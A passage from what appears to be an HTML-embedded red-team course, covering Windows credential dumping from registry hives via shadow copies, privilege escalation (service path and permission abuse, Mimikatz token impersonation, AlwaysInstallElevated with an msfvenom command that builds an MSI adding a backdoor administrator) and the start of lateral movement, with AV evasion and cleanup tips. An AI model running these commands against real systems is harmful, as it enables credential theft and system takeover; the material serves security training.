32\\config\\SECURITY C:\\Temp\\security.hiv\ncopy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopyX\\Windows\\System32\\config\\SYSTEM C:\\Temp\\system.hiv\n</code></pre>\n<em>(Replace <code>X</code> with the correct shadow copy number and <code>C:\\Temp\\</code> with your desired location)</em></li>\n<li><strong>Step 3: Delete the Shadow Copy (OpSec):</strong> Clean up the shadow copy you created.<pre><code class=\"language-cmd\">vssadmin delete shadows /for=C: /Quiet\n</code></pre>\n</li>\n<li><strong>Step 4: Exfiltrate the hive files:</strong> Copy <code>sam.hiv</code>, <code>security.hiv</code>, and <code>system.hiv</code> from the target machine to your attacker machine.</li>\n<li><strong>Step 5: Analyze the hive files:</strong> Use a tool <em>on your attacker machine</em> to extract hashes and secrets. Impacket&#39;s <code>secretsdump.py</code> is excellent for this.</li>\n</ul>\n</li>\n</ol>\n<ul>\n<li><p><strong>Using <code>secretsdump.py</code> (Impacket - on attacker machine):</strong></p>\n<pre><code class=\"language-bash\">secretsdump.py -sam sam.hiv -security security.hiv -system system.hiv LOCAL\n</code></pre>\n<ul>\n<li>This command takes the three hive files as input and will output local user NTLM hashes (from SAM) and LSA Secrets (from SECURITY).</li>\n</ul>\n</li>\n<li><p><strong>Using Mimikatz (Live or via Shadow Copy):</strong> Mimikatz can also dump SAM and SECURITY hives directly, often automating the VSS step or using other techniques.</p>\n<ul>\n<li><strong>Conceptual Command:</strong> <code>mimikatz.exe &quot;lsadump::sam&quot; exit</code> or <code>mimikatz.exe &quot;token::elevate&quot; &quot;lsadump::sam&quot; exit</code> (if needing to elevate first). <code>lsadump::secrets</code> for LSA Secrets.</li>\n</ul>\n</li>\n</ul>\n<p><strong>Expected Output (SAM/SECURITY Hive Analysis):</strong></p>\n<ul>\n<li><p><strong>SAM:</strong> You&#39;ll get a list of local users and their NTLM hashes in a format like:<br><code>Username:RID:LMHash:NTLMHash:::</code>. The LM hash is usually empty on modern systems. The NTLM hash is the important part.<br><code>Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</code> (This is the hash for a blank password - very common in labs!)<br><code>LocalUser:1001:NO PASSWORD*********************:AABBCCDDEEFF11223344556677889900:::</code></p>\n</li>\n<li><p><strong>SECURITY (LSA Secrets):</strong> You might find cached domain credentials, service account passwords, or other system secrets. The output format varies but look for things like <code>_SC_</code> (Service Control) entries or cached domain logons.</p>\n</li>\n</ul>\n<p><strong>OpSec Note:</strong> Creating shadow copies and copying hive files leaves forensic artifacts (event logs, file access timestamps). Executing tools like Mimikatz or scripts that automate this are also high-detection activities.</p>\n<h3></h3>\n\n                </div>\n             </div>\n         ",
    "module-3": "\n             <div class=\"card main-content-card\"> <!-- Added main-content-card class -->\n                <h1>Module 3: module_3</h1> <!-- Use module title here -->\n                <div class=\"markdown-content\">\n                    <p>Alright team, buckle up! We&#39;ve secured that initial foothold, which is fantastic! But let&#39;s be real – landing as a standard user on a Windows box usually means we&#39;re still quite limited. We can look around a bit, maybe poke at some files, but we can&#39;t install tools, modify critical system settings, or access sensitive data protected by Administrator permissions.</p>\n<p>This is where Module 3 comes in. This is where we turn that humble user access into the keys to the kingdom on that specific host. This module is all about <strong>Privilege Escalation (PE)</strong> – the art and science of elevating our access from a low-privileged user to a high-privileged user, typically Administrator or even SYSTEM.</p>\n<p>Think of it like getting past the first guard at the gate (initial access), but then needing to find a way to get the master key instead of just a visitor&#39;s badge.</p>\n<hr>\n<h2><strong>Module 3: Windows Privilege Escalation</strong></h2>\n<p><strong>Module Objective:</strong> By the end of this module, you will be able to systematically enumerate a Windows host for common privilege escalation vectors and successfully exploit at least one method to gain Administrator or SYSTEM level access in a lab environment.</p>\n<p><strong>The &quot;Why&quot;:</strong> Why is PE so critical?</p>\n<ol>\n<li><strong>Access to Sensitive Data:</strong> Administrators and SYSTEM have access to nearly all files, registry keys, and processes on the host. This is where you find sensitive documents, configuration files, and crucially, credentials cached in memory or stored locally.</li>\n<li><strong>Persistence:</strong> Higher privileges make it much easier to establish persistent backdoors (e.g., installing services, modifying startup locations that run with high privileges).</li>\n<li><strong>Springboard for Lateral Movement:</strong> Administrator or SYSTEM access on one machine often provides credentials or tokens that can be reused or leveraged to authenticate to <em>other</em> machines in the network, especially in a domain environment.</li>\n<li><strong>Control:</strong> With high privileges, you can disable security software, clear logs, modify system behavior, and generally operate with less restriction.</li>\n</ol>\n<p><strong>The Mindset:</strong> Privilege escalation isn&#39;t usually one magic bullet. It&#39;s a process of:</p>\n<ol>\n<li><strong>Thorough Enumeration:</strong> What is running? What software is installed? What are the permissions on key files and services? What patches are missing? What are the user&#39;s current privileges?</li>\n<li><strong>Identifying Weaknesses:</strong> Based on your enumeration, spot misconfigurations, known vulnerabilities, or design flaws.</li>\n<li><strong>Planning the Attack:</strong> Determine which identified weakness is most likely to succeed and requires the least risk/noise.</li>\n<li><strong>Execution:</strong> Carry out the exploit.</li>\n<li><strong>Verification:</strong> Confirm you now have higher privileges.</li>\n</ol>\n<p>Let&#39;s dive deep into the core concepts and techniques!</p>\n<hr>\n<h3><strong>3.1 Understanding Windows Integrity Levels and UAC</strong></h3>\n<p>Before we exploit, we need to understand the security model we&#39;re trying to bypass.</p>\n<ul>\n<li><p><strong>Security Identifiers (SIDs):</strong> Every user, group, and service account in Windows has a unique SID (e.g., <code>S-1-5-21-...-500</code> for the built-in Administrator). Permissions are granted to SIDs, not just names.</p>\n</li>\n<li><p><strong>Access Control Lists (ACLs):</strong> Objects (files, folders, registry keys, services, processes, shares) have ACLs which contain Access Control Entries (ACEs). Each ACE specifies permissions (Read, Write, Execute, Modify, Full Control) for a specific SID. PE often involves finding objects where a low-privileged user&#39;s SID has more permissions than intended.</p>\n</li>\n<li><p><strong>Integrity Levels (IL):</strong> Introduced in Windows Vista (along with UAC), ILs add another layer to the security model. Processes run at different integrity levels:</p>\n<ul>\n<li><strong>Low:</strong> Highly restricted (e.g., Internet Explorer in Protected Mode). Cannot write to most system locations.</li>\n<li><strong>Medium:</strong> Standard user processes. Cannot write to system directories without elevation prompt.</li>\n<li><strong>High:</strong> Administrator processes (after UAC elevation).</li>\n<li><strong>SYSTEM:</strong> The highest privilege level. Used by the OS kernel and core services. Has full control over the system.</li>\n<li><strong>Trusted Installer:</strong> Even higher than SYSTEM for specific protected system files.</li>\n</ul>\n<p>A process running at a lower integrity level <em>cannot</em> write to or modify objects running at a higher integrity level. This is a fundamental security boundary.</p>\n</li>\n<li><p><strong>User Account Control (UAC):</strong> This is probably what you see most often. When a standard user (Medium IL) tries to perform an action requiring Administrator privileges (e.g., installing software, changing system-wide settings), Windows prompts the user.</p>\n<ul>\n<li>If the user <em>is</em> a member of the Administrators group, they get a consent prompt (&quot;Do you want to allow this app...&quot;). If they click &quot;Yes,&quot; the process is launched with High integrity.</li>\n<li>If the user is <em>not</em> a member of the Administrators group, they get a credentials prompt, requiring them to enter an administrator username and password.</li>\n</ul>\n<p><strong>Crucially:</strong> UAC is designed to <em>prevent accidental</em> administrative actions and require user <em>consent</em>. It is <strong>not</strong> a security boundary against malicious code already running on the system <em>if</em> that code can interact with processes or components that are designed to auto-elevate or are vulnerable. A UAC bypass allows a Medium integrity process to launch a High integrity process <em>without</em> the user seeing or approving the prompt.</p>\n</li>\n</ul>\n<h3><strong>3.2 Common Privilege Escalation Vectors</strong></h3>\n<p>Now that we understand the target environment&#39;s security features, let&#39;s look at specific weaknesses we can exploit. Remember, <strong>enumeration is key</strong> to finding these!</p>\n<h4><strong>3.2.1 Vulnerable Services</strong></h4>\n<p>Services are background processes that often run with high privileges (SYSTEM, LocalSystem, LocalService, NetworkService) and start automatically when the system boots. Misconfigurations here are a goldmine for PE.</p>\n<ul>\n<li><p><strong>What to Enumerate:</strong></p>\n<ul>\n<li>List all services: <code>Get-Service</code> (PowerShell) or <code>tasklist /svc</code> (CMD).</li>\n<li>Check service configuration: <code>sc qc &lt;service_name&gt;</code> (CMD) or <code>Get-CimInstance win32_service -Filter &quot;Name=&#39;&lt;service_name&gt;&#39;&quot; | Select-Object Name, DisplayName, PathName, StartMode, State, Status, ServiceType, StartName</code> (PowerShell). Look at <code>PathName</code> (the executable path) and <code>StartName</code> (the account it runs as, usually SYSTEM or LocalSystem).</li>\n<li>Check permissions on the service executable path: <code>icacls &quot;&lt;path_to_service_exe&gt;&quot;</code> (CMD) or <code>Get-Acl &quot;&lt;path_to_service_exe&gt;&quot; | Format-List Path, Owner, Access</code> (PowerShell). Look for Write/Modify permissions for &#39;BUILTIN\\Users&#39; or &#39;Everyone&#39;.</li>\n<li>Check permissions on the service configuration key in the registry: Services are configured under <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\&lt;service_name&gt;</code>. Check permissions on this key using <code>reg query HKLM\\SYSTEM\\CurrentControlSet\\Services\\&lt;service_name&gt; /v SD</code> (CMD, then interpret SDDL) or <code>Get-Acl &quot;HKLM:\\SYSTEM\\CurrentControlSet\\Services\\&lt;service_name&gt;&quot; | Format-List Path, Owner, Access</code> (PowerShell). Look for Write permissions for low-priv groups.</li>\n</ul>\n</li>\n<li><p><strong>Common Vulnerabilities &amp; Exploitation:</strong></p>\n<ul>\n<li><p><strong>Unquoted Service Path:</strong> If the <code>PathName</code> of a service contains spaces and is <em>not</em> enclosed in quotes, Windows will try to execute the path segment by segment until it finds an executable.</p>\n<ul>\n<li>Example Path: <code>C:\\Program Files\\My Service\\service.exe</code></li>\n<li>Windows tries to execute:<ol>\n<li><code>C:\\Program.exe</code></li>\n<li><code>C:\\Program Files\\My.exe</code></li>\n<li><code>C:\\Program Files\\My Service\\service.exe</code> (the legitimate service)</li>\n</ol>\n</li>\n<li>If you, as a low-privileged user, have write permissions to <code>C:\\Program Files\\</code>, you could place a malicious <code>My.exe</code> there. The next time the service starts (system boot, manual start, or crash/restart), your malicious <code>My.exe</code> will execute <em>with the service&#39;s privileges</em> (often SYSTEM) instead of the legitimate service.</li>\n<li><strong>Identification:</strong> Look for services where <code>PathName</code> contains spaces and is missing quotes.<pre><code class=\"language-powershell\">Get-CimInstance win32_service | Where-Object {$_.PathName -notmatch &#39;&quot;&#39; -and $_.PathName -match &#39;\\s&#39;} | Select-Object Name, DisplayName, PathName, StartName\n</code></pre>\n<pre><code class=\"language-cmd\">wmic service get name,pathname,startmode | findstr /i &quot;Auto&quot; | findstr /i &quot;System&quot; | findstr /v &quot;&quot;&quot;\n</code></pre>\n(The CMD version is less precise but can find some). Then verify directory permissions using <code>icacls</code> on the directories (<code>C:\\</code>, <code>C:\\Program Files\\</code>, etc.).</li>\n<li><strong>Exploitation:</strong><ol>\n<li>Confirm you have write permissions to the directory where you&#39;ll place your malicious executable (e.g., <code>C:\\Program Files\\</code>).</li>\n<li>Create a malicious executable (e.g., <code>my.exe</code>) that performs your desired action (add a user, launch a shell, etc.). Make sure its name matches the segment Windows will try to execute (e.g., <code>My.exe</code> for <code>C:\\Program Files\\My Service\\service.exe</code>).</li>\n<li>Place <code>my.exe</code> in the vulnerable directory.</li>\n<li>Restart the service (if possible and low-risk, otherwise wait for system restart) using <code>Restart-Service &lt;service_name&gt;</code> (PowerShell) or <code>sc stop &lt;service_name&gt;</code> then <code>sc start &lt;service_name&gt;</code> (CMD). <em>Be cautious restarting services, it might break things!</em></li>\n<li>Your <code>my.exe</code> should execute with the service&#39;s privileges.</li>\n</ol>\n</li>\n</ul>\n</li>\n<li><p><strong>Weak Service Permissions (Service Binary/Configuration):</strong> If a low-privileged user has write/modify permissions on the service&#39;s executable file (<code>PathName</code>) or its registry configuration key, they can alter the service&#39;s behavior.</p>\n<ul>\n<li><strong>Identification:</strong> Check permissions as described above using <code>icacls</code> or <code>Get-Acl</code>. Look for &#39;Write&#39; or &#39;Modify&#39; permissions for your user or groups you belong to on the service executable or its registry key.<pre><code class=\"language-powershell\"># Check permissions on the service executable (replace path)\nGet-Acl &quot;C:\\Program Files\\Vulnerable Service\\vulnerable.exe&quot; | Format-List Path, Owner, Access\n\n# Check permissions on the service registry key (replace service name)\nGet-Acl &quot;HKLM:\\SYSTEM\\CurrentControlSet\\Services\\VulnerableService&quot; | Format-List Path, Owner, Access\n</code></pre>\n</li>\n<li><strong>Exploitation (Modifying Binary):</strong><ol>\n<li>If you have write access to the service executable, rename the original (<code>vulnerable.exe</code> to <code>vulnerable.exe.bak</code>).</li>\n<li>Place your malicious executable (named <code>vulnerable.exe</code>) in its place.</li>\n<li>Restart the service. Your malicious executable runs with service privileges.</li>\n</ol>\n</li>\n<li><strong>Exploitation (Modifying Config):</strong><ol>\n<li>If you have write access to the service&#39;s registry key, you can modify the <code>ImagePath</code> value to point to your malicious executable.</li>\n<li>Restart the service. Your malicious executable runs.</li>\n</ol>\n<pre><code class=\"language-powershell\"># Example: Modify ImagePath (replace service and path)\nSet-ItemProperty -Path &quot;HKLM:\\SYSTEM\\CurrentControlSet\\Services\\VulnerableService&quot; -Name &quot;ImagePath&quot; -Value &quot;C:\\Path\\To\\Your\\Malicious.exe&quot;\n# Then restart service\nRestart-Service VulnerableService\n</code></pre>\n<p><em>Again, be very careful modifying service configurations or binaries, this can easily break the system!</em></p>\n</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n<h4><strong>3.2.2 Token Manipulation / Impersonation</strong></h4>\n<p>Windows uses &quot;tokens&quot; to represent the security context of a user or process. Tokens contain SIDs, privileges, integrity levels, etc. Certain privileges allow a process to impersonate another user&#39;s token.</p>\n<ul>\n<li><strong><code>SeImpersonatePrivilege</code> or <code>SeAssignPrimaryTokenPrivilege</code>:</strong> If a user or service account holds one of these privileges, they <em>might</em> be able to impersonate other logged-on users or service accounts on that system. Web servers or database servers often hold <code>SeImpersonatePrivilege</code> to impersonate clients.</li>\n<li><strong>Identification:</strong> Check your current user&#39;s privileges using <code>whoami /priv</code> (CMD) or <code>(Get-CimInstance win32_tokenprivileges -Filter &quot;GetEnabled=&#39;true&#39;&quot;).Privileges | Where-Object {$_.DisplayName -like &#39;*impersonate*&#39; -or $_.DisplayName -like &#39;*assign*&#39;}</code> (PowerShell - rough example).</li>\n<li><strong>Exploitation:</strong> This is typically exploited using tools like Mimikatz&#39;s <code>incognito</code> module.<pre><code># Example Mimikatz usage (requires Admin or SeDebugPrivilege)\nsekurlsa::logonpasswords  # Dumps credentials from LSASS\nincognito::list_tokens    # Lists impersonatable tokens\nincognito::impersonate_token &lt;Token_ID_or_Username&gt; # Impersonate a token\n# Or often used after getting SeDebugPrivilege to access LSASS\n</code></pre>\n<strong>Teacher&#39;s Note:</strong> Mimikatz is a <em>very</em> powerful tool for Windows security analysis, but it&#39;s also heavily detected by AV/EDR. Using it directly often requires bypassing security software. The <code>incognito</code> module allows you to potentially elevate <em>without</em> dumping credentials directly, by just leveraging existing tokens.</li>\n</ul>\n<h4><strong>3.2.3 Insecure File and Registry Permissions</strong></h4>\n<p>Similar to services, general file system or registry objects can have weak permissions allowing low-privileged users to modify files or keys that are later used or executed by high-privileged processes.</p>\n<ul>\n<li><strong>What to Enumerate:</strong><ul>\n<li>Permissions on critical directories: <code>C:\\</code>, <code>C:\\Program Files</code>, <code>C:\\Program Files (x86)</code>, <code>C:\\Windows\\System32</code>, <code>C:\\Windows\\Tasks</code>. Use <code>icacls &lt;directory&gt;</code>.</li>\n<li>Permissions on specific files in those directories, especially <code>.exe</code>, <code>.dll</code>, <code>.bat</code>, <code>.ps1</code>, <code>.vbs</code> files.</li>\n<li>Permissions on common persistence locations in the registry: <code>HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code>, <code>HKCU\\...Run</code>, <code>HKLM\\...\\RunOnce</code>, <code>HKLM\\SYSTEM\\CurrentControlSet\\Services</code> (covered in services), Scheduled Tasks keys. Use <code>reg query &lt;key&gt; /v SD</code> or <code>Get-Acl &lt;Registry::Path&gt;</code>.</li>\n<li>Permissions on program directories where high-privilege software is installed.</li>\n</ul>\n</li>\n<li><strong>Identification:</strong> Look for &#39;Write&#39; or &#39;Modify&#39; permissions for &#39;BUILTIN\\Users&#39; or &#39;Everyone&#39; on files/keys that high-privilege processes interact with or execute.<pre><code class=\"language-powershell\"># Example: Check permissions on a common Run key\nGet-Acl &quot;HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run&quot; | Format-List Path, Owner, Access\n\n# Example: Find writable files in Program Files (this can be slow!)\n# Adjust filter/depth as needed. Be careful with recursion.\nGet-ChildItem -Path &quot;C:\\Program Files&quot; -Recurse -Force -ErrorAction SilentlyContinue | Get-Acl -ErrorAction SilentlyContinue | Where-Object {$_.AccessToString -match &quot;BUILTIN\\\\Users.*\\(M\\)&quot; -or $_.AccessToString -match &quot;Everyone.*\\(M\\)&quot; -or $_.AccessToString -match &quot;BUILTIN\\\\Users.*\\(W\\)&quot; -or $_.AccessToString -match &quot;Everyone.*\\(W\\)&quot;} | Select-Object Path\n</code></pre>\n</li>\n<li><strong>Exploitation:</strong><ul>\n<li><strong>DLL Hijacking:</strong> If a high-privilege process tries to load a DLL from a directory where you have write permissions, you can place a malicious DLL with the expected name there. The process might load <em>your</em> DLL instead of the legitimate one, executing your code with its privileges. This is complex and requires understanding DLL loading order.</li>\n<li><strong>Executable Replacement:</strong> If you have write access to an executable that&#39;s run by a high-privilege process (e.g., a scheduled task running as SYSTEM), you can replace the executable with your own.</li>\n<li><strong>Registry Modification:</strong> If you can write to a registry key that a high-privilege process reads or executes (like a Run key or a service <code>ImagePath</code>), you can inject a command or path to your malicious code.</li>\n</ul>\n</li>\n</ul>\n<h4><strong>3.2.4 Auto-logon Credentials / Saved RDP Credentials</strong></h4>\n<p>Sometimes systems are configured for automatic logon, storing credentials (often obfuscated) in the registry. Or users might save RDP credentials. While not a <em>privilege escalation</em> on the <em>current</em> host itself, finding these can give you high-privilege credentials for the <em>same</em> host or <em>other</em> hosts, effectively bypassing the need for a traditional PE exploit.</p>\n<ul>\n<li><strong>Identification:</strong> Look in the registry: <code>HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon</code> for <code>AutoAdminLogon</code>, <code>DefaultUserName</code>, <code>DefaultPassword</code>. Look for saved RDP connections and potentially extract credentials (though this is harder and often requires Admin).</li>\n<li><strong>Exploitation:</strong> Use tools (like Mimikatz or specific credential extractors) to retrieve the cleartext password or hash from the registry.</li>\n</ul>\n<h4><strong>3.2.5 Kernel Exploits</strong></h4>\n<p>These exploit vulnerabilities in the Windows kernel itself. They are often highly reliable for PE <em>if</em> the target system is running a vulnerable version of the kernel and hasn&#39;t been patched.</p>\n<ul>\n<li><strong>How they work (Conceptually):</strong> Kernel exploits typically involve tricking the kernel into executing malicious code in kernel mode, or manipulating kernel data structures to grant the attacker&#39;s process SYSTEM privileges.</li>\n<li><strong>Identification:</strong> This is primarily about <strong>identifying the exact OS version and patch level</strong> of the target (<code>systeminfo</code>, <code>Get-ComputerInfo</code>, <code>Get-HotFix</code>). Then, compare this information against public databases of known Windows kernel vulnerabilities and available exploits (e.g., Exploit-DB, security advisories).</li>\n<li><strong>Exploitation:</strong> Using a pre-compiled exploit binary or script designed for the <em>specific</em> vulnerable OS version/patch.<ul>\n<li><strong>Teacher&#39;s Note:</strong> Kernel exploits are powerful but risky. They can cause Blue Screens of Death (BSODs), are highly signatured by AV/EDR, and require precise targeting. In a real engagement, they are often a last resort. In a lab, they are valuable for understanding, but always use stable, known exploits and be prepared to snapshot/revert the VM. We will <em>not</em> be writing kernel exploit code, but rather focusing on identifying the <em>opportunity</em> and using existing tools if available in the lab.</li>\n</ul>\n</li>\n</ul>\n<h3><strong>3.3 Automated PE Tools</strong></h3>\n<p>Manually enumerating all the potential vectors above can be time-consuming. Fortunately, several excellent tools automate this process. They scan the system, look for common misconfigurations and vulnerabilities, and report potential PE paths.</p>\n<ul>\n<li><p><strong><code>PowerUp</code> (PowerShell):</strong> Part of the PowerSploit framework, <code>PowerUp</code> is a PowerShell script specifically designed to find common Windows PE vectors like vulnerable services, DLL hijacking opportunities, AlwaysInstallElevated, etc.</p>\n<ul>\n<li><strong>Usage:</strong><ol>\n<li>Load the script: <code>Import-Module .\\PowerUp.ps1</code> or dot-source it <code>. .\\PowerUp.ps1</code>.</li>\n<li>Run the main check function: <code>Invoke-AllChecks</code></li>\n</ol>\n</li>\n<li><strong>Output:</strong> <code>Invoke-AllChecks</code> will output a list of potential vulnerabilities found, often with suggestions on how to exploit them.</li>\n<li><strong>Teacher&#39;s Note:</strong> PowerShell scripts might be blocked by execution policies or Antivirus. You might need to bypass these, which is a separate topic (OpSec!).</li>\n</ul>\n</li>\n<li><p><strong><code>WinPEAS</code> (Windows Privilege Escalation Awesome Scripts):</strong> A standalone executable (<code>.exe</code>) that performs extensive local enumeration. It checks for file/registry permissions, services, processes, scheduled tasks, installed software, network information, credentials in files, and much more. It has both <code>.bat</code> and <code>.exe</code> versions, and different editions (e.g., <code>winPEASany.exe</code>).</p>\n<ul>\n<li><strong>Usage:</strong> Download and run the appropriate version.<pre><code class=\"language-cmd\"># Basic execution\nwinPEASany.exe\n\n# Output to file\nwinPEASany.exe &gt; winpeas_results.txt\n</code></pre>\n</li>\n<li><strong>Output:</strong> <code>WinPEAS</code> prints its findings to the console, often color-coded. It highlights potential vulnerabilities.</li>\n<li><strong>Teacher&#39;s Note:</strong> <code>WinPEAS</code> is often detected by AV/EDR. You might need to use obfuscated versions or run it from memory.</li>\n</ul>\n</li>\n<li><p><strong><code>Sherlock</code> (PowerShell):</strong> A PowerShell script focused on finding missing software patches that correspond to known kernel exploits. It compares the installed patches against a list of vulnerabilities.</p>\n<ul>\n<li><strong>Usage:</strong><ol>\n<li>Load the script: <code>Import-Module .\\Sherlock.ps1</code> or <code>. .\\Sherlock.ps1</code>.</li>\n<li>Run the check: <code>Find-AllVulns</code></li>\n</ol>\n</li>\n<li><strong>Output:</strong> Lists potential kernel vulnerabilities based on missing patches.</li>\n<li><strong>Teacher&#39;s Note:</strong> <code>Sherlock</code> only tells you <em>if</em> the system is vulnerable, not <em>how</em> to exploit it. You&#39;d then need to find a reliable exploit for the reported CVE.</li>\n</ul>\n</li>\n</ul>\n<p><strong>Important Note on Automated Tools:</strong> These tools are <em>enumerators</em>. They <em>find</em> potential weaknesses. They don&#39;t always <em>exploit</em> them for you (though <code>PowerUp</code> has some exploitation functions). You still need to understand <em>why</em> the reported issue is a vulnerability and <em>how</em> to manually or semi-automatically exploit it. Relying solely on tools without understanding is a recipe for failure and getting caught.</p>\n<h3><strong>3.4 Case Study: AlwaysInstallElevated</strong></h3>\n<p>Let&#39;s look at a classic, simple PE vector: the <code>AlwaysInstallElevated</code> registry key.</p>\n<ul>\n<li><strong>The Vulnerability:</strong> Windows Installer (msiexec) can be configured via Group Policy or registry keys to install <code>.msi</code> packages with elevated privileges (SYSTEM) even if the user running the installer is not an administrator. This feature is intended for specific deployment scenarios but is a major security risk if enabled globally.</li>\n<li><strong>Identification:</strong> Check these two registry keys:<ul>\n<li><code>HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\\AlwaysInstallElevated</code></li>\n<li><code>HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\\AlwaysInstallElevated</code></li>\n<li>If <em>both</em> keys exist and are set to <code>1</code>, the vulnerability is present.</li>\n</ul>\n<pre><code class=\"language-powershell\"># Check HKCU\nGet-ItemProperty -Path &quot;HKCU:\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer&quot; -Name &quot;AlwaysInstallElevated&quot; -ErrorAction SilentlyContinue\n\n# Check HKLM\nGet-ItemProperty -Path &quot;HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer&quot; -Name &quot;AlwaysInstallElevated&quot; -ErrorAction SilentlyContinue\n</code></pre>\n<pre><code class=\"language-cmd\">reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\nreg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\n</code></pre>\n</li>\n<li><strong>Exploitation:</strong><ol>\n<li>If both keys are <code>1</code>, you can create a malicious <code>.msi</code> package.</li>\n<li>Execute the <code>.msi</code> package using <code>msiexec</code>.</li>\n<li>Your code within the <code>.msi</code> package will execute with SYSTEM privileges.</li>\n</ol>\n<ul>\n<li><strong>Creating a Malicious MSI:</strong> This requires specific tools (like <code>msfvenom</code> or creating a custom WiX project). <code>msfvenom</code> is the simpler route for red teaming.<pre><code class=\"language-bash\"># Example using msfvenom to create an MSI that adds a user &#39;hacker&#39; with password &#39;Password123!&#39;\nmsfvenom -p windows/exec CMD=&#39;net user hacker Password123! /add &amp;&amp; net localgroup administrators hacker /add&#39; -f msi -o evil.msi\n</code></pre>\n</li>\n<li><strong>Executing the MSI:</strong><pre><code class=\"language-cmd\">msiexec /quiet /qn /i C:\\Path\\To\\\n</code></pre>\n</li>\n</ul>\n</li>\n</ul>\n\n                </div>\n             </div>\n         ",
    "module-4": "\n             <div class=\"card main-content-card\"> <!-- Added main-content-card class -->\n                <h1>Module 4: module_4</h1> <!-- Use module title here -->\n                <div class=\"markdown-content\">\n                    <p>Alright, fellow knowledge seekers! Let&#39;s dive deep into Module 4 of our journey: <strong>Lateral Movement Techniques</strong>. This is where we take that initial foothold and start exploring the network, turning one compromised machine into a launching pad for wider access.</p>\n<p>This module is absolutely critical. In most real-world scenarios, the initial access point isn&#39;t the ultimate target (like the Domain Controller or a critical database server). You <em>have</em> to move laterally to get there. Mastering these techniques is fundamental to successful red teaming and understanding how attackers propagate within a network.</p>\n<hr>\n<h3><strong>Module 4: Lateral Movement Techniques</strong></h3>\n<ul>\n<li><strong>Module Objective:</strong> Master various techniques to move from a compromised host to other systems within the network using harvested credentials, session reuse, and native tools.</li>\n</ul>\n<hr>\n<p>Welcome back! By now, you&#39;ve gained a foothold on a Windows machine (Module 1), enumerated valuable local info and credentials (Module 2), and potentially elevated your privileges to Administrator or SYSTEM on that host (Module 3). Fantastic work!</p>\n<p>But we&#39;re not stopping there. Our objective isn&#39;t just one machine; it&#39;s often the entire domain. To get there, we need to move from our current position to other machines on the network. This is the essence of <strong>Lateral Movement</strong>.</p>\n<p><strong>What is Lateral Movement?</strong></p>\n<p>Lateral movement refers to the techniques adversaries use to navigate to and control systems other than the initially compromised host. It&#39;s about expanding your access and reach within the target network. Think of it like moving through rooms in a building after you&#39;ve gotten through the front door.</p>\n<p><strong>Why is Lateral Movement Necessary?</strong></p>\n<ol>\n<li><strong>Reach High-Value Targets:</strong> Domain controllers, critical servers (databases, file shares, applications), and executive workstations often aren&#39;t directly accessible from the internet or the initial access point.</li>\n<li><strong>Gather More Information:</strong> Moving to different systems provides new perspectives, potentially revealing more sensitive data, additional users, group memberships, network diagrams, or credentials.</li>\n<li><strong>Find Better Credentials:</strong> Compromising more machines increases the chances of finding credentials for higher-privileged accounts, which are essential for achieving domain dominance.</li>\n<li><strong>Establish Persistence:</strong> Spreading access across multiple hosts makes it harder for defenders to evict you completely if they find and clean up one machine.</li>\n<li><strong>Access Specific Resources:</strong> You might need to reach a specific application server or file share to complete your objective.</li>\n</ol>\n<hr>\n<h4><strong>Essential Subtopics &amp; Deep Dive:</strong></h4>\n<h5><strong>4.1 Understanding Network Topology &amp; Trust Relationships</strong></h5>\n<p>Before you start moving, you need to know where you <em>can</em> move and where you <em>want</em> to move. This requires understanding the network layout and how systems are connected and trust each other.</p>\n<ul>\n<li><p><strong>Network Topology:</strong></p>\n<ul>\n<li>Are there different subnets?</li>\n<li>Are there firewalls between segments?</li>\n<li>What&#39;s the general layout (flat network, segmented, DMZ)?</li>\n<li>Identifying nearby hosts is a crucial first step. We touched on this in Module 1 (<code>ipconfig</code>, <code>netstat</code>). From a compromised host, you can also:<ul>\n<li>Check the local ARP cache (<code>arp -a</code>).</li>\n<li>Ping known hosts (like the default gateway, DNS servers found in <code>ipconfig</code>).</li>\n<li>Use tools like <code>nmap</code> (if available or uploaded) or native PowerShell/CMD methods to scan local subnets (<code>for /L %i in (1,1,254) do ping -n 1 -w 100 192.168.1.%i &amp; if errorlevel 0 echo 192.168.1.%i &gt;&gt; live_hosts.txt</code>).</li>\n<li>Look at network shares connected (<code>net use</code>).</li>\n<li>Examine DNS cache (<code>ipconfig /displaydns</code>).</li>\n</ul>\n</li>\n</ul>\n</li>\n<li><p><strong>Trust Relationships (within a Windows Domain):</strong></p>\n<ul>\n<li>In a domain environment, machines trust the Domain Controller to authenticate users.</li>\n<li>Users authenticated on one domain-joined machine can often access resources on <em>other</em> domain-joined machines <em>if</em> they have the necessary permissions <em>and</em> the target machine trusts the authentication source.</li>\n<li>Understanding which users have administrative rights on which machines is key. Local Administrator groups on workstations often contain Domain Admins or specific privileged domain users.</li>\n<li>We&#39;ll dive much deeper into Active Directory structure and trusts in Module 5, but keep in mind <em>who</em> you are authenticated as and <em>where</em> that identity is trusted is paramount for lateral movement.</li>\n</ul>\n</li>\n</ul>\n<p><strong>How to find potential targets from the initial host (Native/PowerShell):</strong></p>\n<pre><code class=\"language-powershell\"># Find computers in the current domain (requires ActiveDirectory module or PowerView)\n# Using PowerView (often preferred in offensive scenarios)\n# Assuming PowerView is loaded (e.g., via Import-Module or dot-sourcing)\nGet-DomainComputer | Select-Object Name, OperatingSystem, LastLogonDate | Format-Table -AutoSize\n\n# Basic network scanning using Test-Connection (ping)\n# Replace 192.168.1.0/24 with the local subnet\n$subnet = &quot;192.168.1.&quot;\nfor ($i = 1; $i -le 254; $i++) {\n    $ip = $subnet + $i\n    if (Test-Connection -ComputerName $ip -Count 1 -ErrorAction SilentlyContinue) {\n        Write-Host &quot;$ip is Online&quot;\n    }\n}\n\n# Check for open RDP ports (3389) on potential targets\n# Requires 